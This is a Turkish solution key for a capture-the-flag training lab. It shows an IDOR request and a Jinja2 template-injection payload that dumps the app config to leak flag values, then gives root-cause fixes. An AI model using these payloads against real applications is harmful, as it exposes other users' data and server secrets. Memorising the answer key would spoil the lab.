# Çözüm Anahtarı — Şablon Lab  ⚠️ SPOILER

> Bu dosya bakım ekibi (İçerik Takımı) içindir. Kendi labında `COZUM.md`
> eklemek **opsiyoneldir**; eklersen tepesine bu spoiler uyarısını koy.

## Flag 1 — IDOR
Notlar sıralı `id` ile sunuluyor ve "bu not senin mi?" kontrolü yok:
```bash
curl -s http://localhost:8080/api/not/42
# → TUGA{idor_ile_baskasinin_notunu_okudum}
```

## Flag 2 — SSTI (Jinja2)
`/selamla?ad=` girdisi doğrudan şablona gömülüyor:
```bash
# Enjeksiyon kanıtı:
curl -s "http://localhost:8080/selamla?ad={{7*7}}"        # → Merhaba 49
# Config'i dök, gizli bayrağı sızdır:
curl -sG "http://localhost:8080/selamla" --data-urlencode "ad={{ config.items() }}"
# → ... 'GIZLI_BAYRAK': 'TUGA{jinja2_ssti_ile_config_sizdirdim}' ...
```

## Kök neden / düzeltme (eğitim notu)
- IDOR: nesneye erişimde sahiplik/yetki kontrolü yapılmalı.
- SSTI: kullanıcı girdisi şablona gömülmemeli; `render_template_string(sabit, ad=ad)`
  gibi parametreli kullanım veya `escape` şart.
